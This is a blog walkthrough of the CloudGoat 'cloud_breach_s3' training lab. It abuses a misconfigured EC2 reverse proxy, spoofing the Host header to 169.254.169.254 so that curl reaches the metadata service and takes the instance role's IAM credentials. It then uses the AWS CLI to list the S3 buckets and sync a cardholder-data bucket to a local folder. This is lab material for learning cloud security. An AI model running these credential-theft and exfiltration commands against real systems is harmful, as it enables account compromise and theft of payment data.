---
title:  "CloudGoat: Cloud Breach S3"
date:   2024-03-17
tags: cloudsecurity cybersecurity aws
last_modified_at: 2024-03-17
---

We did not get any users in this scenario, but we knew the IP Address of EC2 instance which is a misconfigured reversed proxy server. We will take credentials from the instance role, and use this credentials to exfiltrate data from S3.

### Get Role from EC2
```shell
curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'
```

Result:
```
cg-banking-WAF-Role-cloud_breach_s3_###
```

We got the role for this instance

### Get role credentials
```shell
curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cloud_breach_s3_### -H 'Host:169.254.169.254'
```

Result:
```json
{
  "AccessKeyId" : "<access-key-id>",
  "SecretAccessKey" : "<secret-access-key",
  "Token" : "<session-token"
}
```

To create AWS cli profile, <a href="{% post_url 2024-03-05-cloudgoat-vulnerable-lambda %}">see here</a>

In this blog, I will use `cg-banking` as an assumed role.

### List S3 buckets
```shell
aws --profile cg-banking s3 ls
```

Result:
```
2024-03-17 16:03:00 cg-cardholder-data-bucket-cloud-breach-s3-###
```

### Get PII data
To download all data from S3 to our local computer, we will sync our local folder with S3 bucket
```shell
aws --profile cg-banking s3 sync s3://cg-cardholder-data-bucket-cloud-breach-s3-### ./cardholder-data
```

See all files in folder
```shell
ls cardholder-data
```

Result:
```
cardholder_data_primary.csv   cardholders_corporate.csv
cardholder_data_secondary.csv goat.png
```

🎇 All cardholder data are in our hands.
